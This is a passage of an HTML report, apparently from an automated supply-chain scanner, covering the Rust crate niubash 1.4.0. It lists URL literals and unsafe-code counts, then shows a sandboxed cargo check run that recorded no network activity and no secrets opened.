+<li><code class="evidence-text">WARNING: plaintext http:// mirror — fetches are unencrypted and unauthenticated; the tree checksum pin (`niu plugin source verify`) is the only tamper tripwire.</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3024" rel="noreferrer noopener" target="_blank">src/main.rs:3024</a> </span></li>
+
+<li><code class="evidence-text">A plaintext http:// mirror is refused without --allow-plaintext (it</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3216" rel="noreferrer noopener" target="_blank">src/main.rs:3216</a> </span></li>
+
+<li><code class="evidence-text">  git_instead_of = &#34;https://your-git-mirror/&#34;    # git clone/fetch</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3223" rel="noreferrer noopener" target="_blank">src/main.rs:3223</a> </span></li>
+
+<li><code class="evidence-text">                          https://github.com/&#60;owner/repo&#62;.git</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3675" rel="noreferrer noopener" target="_blank">src/main.rs:3675</a> </span></li>
+
+<li><code class="evidence-text">  &#60;url&#62;                   A git url (https://, git@, or</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3676" rel="noreferrer noopener" target="_blank">src/main.rs:3676</a> </span></li>
+
+<li><code class="evidence-text">                          file:///&#60;path&#62; — file:// clones via git)</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3677" rel="noreferrer noopener" target="_blank">src/main.rs:3677</a> </span></li>
+
+<li><code class="evidence-text">                           GitHub shorthand, git url — file:// works,</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/main.rs#L3715" rel="noreferrer noopener" target="_blank">src/main.rs:3715</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">url_literal</span> <span class="context">library</span> <span class="count">17</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">https://github.com/{repo}/releases/latest</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L294" rel="noreferrer noopener" target="_blank">src/self_update.rs:294</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/{repo}/releases/download/{tag}/{asset_name}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L310" rel="noreferrer noopener" target="_blank">src/self_update.rs:310</a> </span></li>
+
+<li><code class="evidence-text">SHA-256 digest asset &#39;{}&#39; could not be downloaded; refusing to run an unverifiable installer (fail-closed, niubash#311). Download the installer manually from https://github.com/{repo}/releases/tag/{ta…</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L368" rel="noreferrer noopener" target="_blank">src/self_update.rs:368</a> </span></li>
+
+<li><code class="evidence-text">https://</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L685" rel="noreferrer noopener" target="_blank">src/self_update.rs:685</a> </span></li>
+
+<li><code class="evidence-text">http://</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L687" rel="noreferrer noopener" target="_blank">src/self_update.rs:687</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/{repo}/releases/latest/download/{stable_name}</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L806" rel="noreferrer noopener" target="_blank">src/self_update.rs:806</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/download/v0.8.2/niubash-v0.8.2-win-x64-setup.exe</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1029" rel="noreferrer noopener" target="_blank">src/self_update.rs:1029</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/latest/download/niubash-win-x64-setup.exe</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1040" rel="noreferrer noopener" target="_blank">src/self_update.rs:1040</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/oh-my-niu/releases/download/v1.0.0/oh-my-niu-1.0.0.zip</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1049" rel="noreferrer noopener" target="_blank">src/self_update.rs:1049</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/latest/download/niubash-win-x64-setup.exe.sha256</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1065" rel="noreferrer noopener" target="_blank">src/self_update.rs:1065</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/download/v0.8.2/niubash-v0.8.2-win-x64-setup.exe.sha256</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1075" rel="noreferrer noopener" target="_blank">src/self_update.rs:1075</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/tag/v0.8.2</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1252" rel="noreferrer noopener" target="_blank">src/self_update.rs:1252</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/tag/v0.8.2?expanded=true</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1257" rel="noreferrer noopener" target="_blank">src/self_update.rs:1257</a> </span></li>
+
+<li><code class="evidence-text">https://github.com/unixwin/niubash/releases/latest</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1262" rel="noreferrer noopener" target="_blank">src/self_update.rs:1262</a> </span></li>
+
+<li><code class="evidence-text">https://api.github.com/repos/unixwin/niubash/releases/latest?x=1</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1288" rel="noreferrer noopener" target="_blank">src/self_update.rs:1288</a> </span></li>
+
+<li><code class="evidence-text">https://example.com/downloads/app.exe?x=1#asset</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1300" rel="noreferrer noopener" target="_blank">src/self_update.rs:1300</a> </span></li>
+
+<li><code class="evidence-text">https://example.com:not-a-port/file</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L1309" rel="noreferrer noopener" target="_blank">src/self_update.rs:1309</a> </span></li>
+
+</ul>
+</details>
+
+<details class="group sev-info">
+<summary><span class="badge tone-info">info</span> <span class="kind">unsafe_code</span> <span class="context">library</span> <span class="count">2</span></summary>
+<ul class="items">
+
+<li><code class="evidence-text">3 unsafe blocks, functions or impls</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/piped_stdout.rs#L153" rel="noreferrer noopener" target="_blank">src/piped_stdout.rs:153</a> </span></li>
+
+<li><code class="evidence-text">17 unsafe blocks, functions or impls</code>
+<span class="places"><a class="place" href="https://crates.io/crates/niubash/1.4.0/code/src/self_update.rs#L266" rel="noreferrer noopener" target="_blank">src/self_update.rs:266</a> </span></li>
+
+</ul>
+</details>
+
+</div>
+
+
+
+
+<section class="run" id="run-check">
+<div class="run-head">
+  <h2>Run: check</h2>
+  <span class="badge ok">succeeded</span>
+  
+</div>
+
+
+
+
+<dl class="facts">
+<div><dt>Ended</dt><dd>agent reported the end</dd></div><div><dt>Guest</dt><dd>exit code 0</dd></div><div><dt>Run time</dt><dd>525 ms</dd></div><div><dt>VM restore</dt><dd>69 ms</dd></div><div><dt>Payload</dt><dd>16227 files, 487.7 MiB</dd></div><div><dt>Files opened</dt><dd>611</dd></div>
+</dl>
+
+<div class="panel proc">
+<h3>Processes <span class="muted">2</span></h3>
+
+<p class="hint">Siblings that ran the same program with the same result and the same processes below are folded into one row, with their number.
+<label class="toggle"><input type="checkbox" checked> Hide the 1 compiler processes (rustc, C toolchain)</label></p>
+<div class="scroll">
+<table class="tree">
+<thead><tr><th>Process</th><th>Arguments</th><th>Start</th><th>Took</th><th>Exit</th></tr></thead>
+<tbody>
+
+<tr class="role-cargo">
+<td class="d0"><span class="badge role">cargo</span> <span class="mono" title="pid 572: /usr/local/bin/cargo">/usr/local/bin/cargo</span></td>
+<td class="mono args">check --locked --offline</td>
+<td class="nowrap muted">5 ms</td>
+<td class="nowrap">517 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+<tr class="role-rustc compiler">
+<td class="d1"><span class="branch">└</span><span class="badge role">rustc</span> <span class="mono" title="pid 579: /usr/local/bin/rustc">/usr/local/bin/rustc</span></td>
+<td class="mono args">--crate-name crateward_probe --edition=2021 lib.rs --error-format=json --json=diagnostic-rendered-ansi,artifacts,future-incompat --crate-type lib --emit=dep-info,metadata -C embed-bitcode=no -C debuginfo=2 --check-cfg cfg(docsrs,test) --check-cfg cfg(feature, values()) -C metadata=d9152fcf76bf9b7f -C extra-filename=-8c7788aadf5d3a75 --out-dir /work/target/debug/deps -C incremental=/work/target/debug/incremental -L dependency=/work/target/debug/deps</td>
+<td class="nowrap muted">294 ms</td>
+<td class="nowrap">211 ms</td>
+<td class="nowrap">0</td>
+</tr>
+
+</tbody>
+</table>
+</div>
+
+
+</div>
+
+<div class="panel">
+<h3>Network <span class="muted">0</span></h3>
+
+<p class="muted">No network activity.</p>
+
+</div>
+
+<div class="panel">
+<h3>Files <span class="muted">0</span></h3>
+<h4>Secrets opened</h4>
+<p class="muted">None.</p>
+<h4>Written outside the build directories</h4>
+<p class="muted">None.</p>
+
+</div>
+
+<div class="panel">
+<h3>Scratch disk <span class="muted">0</span></h3>
+
+<dl class="facts">
+<div><dt>Files</dt><dd>21</dd></div><div><dt>Directories</dt><dd>19</dd></div><div><dt>Size</dt><dd>77.8 KiB</dd></div><div><dt>Compiled units</dt><dd>1</dd></div>
+</dl>
+<p class="muted">Nothing outside the build areas.</p>
+
+</div>
+
+<div class="panel">
+<h3>Output</h3>
+
+<details><summary>Standard error</summary><pre>warning: crateward-probe v0.0.0 (/cw/probe) ignoring invalid dependency `target` which is missing a lib target
+    Checking crateward-probe v0.0.0 (/cw/probe)
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.46s
+</pre></details>
+
+</div>
+</section>
+
+
+<details class="section" id="timeline">
+<summary><h2>Timeline</h2> <span class="count">6</span></summary>
+<table>
+<thead><tr><th>When</th><th>From</th><th>To</th><th>Event</th><th>Worker</th></tr></thead>
+<tbody>
+
+<tr><td class="muted nowrap">2026-10-13 11:58 UTC</td><td class="nowrap">Discovered</td><td class="nowrap">Fetched</td><td>fetched</td><td class="muted">fetcher-1896447</td></tr>
+
+<tr><td class="muted nowrap">2026-10-13 11:58 UTC</td><td class="nowrap">Fetched</td><td class="nowrap">ReadyForSandbox</td><td>static_analysis_completed</td><td class="muted">static-1896495</td></tr>
+
+<tr><td class="muted nowrap">2026-10-13 12:19 UTC</td><td class="nowrap">ReadyForSandbox</td><td class="nowrap">Running</td><td>sandbox_started</td><td class="muted">orchestrator-1898673-slot1</td></tr>
+
+<tr><td class="muted nowrap">2026-10-13 12:19 UTC</td><td class="nowrap">Running</td><td class="nowrap">DynamicallyAnalyzed</td><td>sandbox_completed</td><td class="muted">orchestrator-1898673-slot1</td></tr>
+
+<tr><td class="muted nowrap">2026-10-13 12:19 UTC</td><td class="nowrap">DynamicallyAnalyzed</td><td class="nowrap">Scored</td><td>scored</td><td class="muted">analyzer-1898703</td></tr>
+
+<tr><td class="muted nowrap">2026-10-13 12:19 UTC</td><td class="nowrap">Scored</td><td class="nowrap">Done</td><td>finalized</td><td class="muted">analyzer-1898703</td></tr>
+
+</tbody>
+</table>
+</details>
+
+</main>
+</body>
+</html>
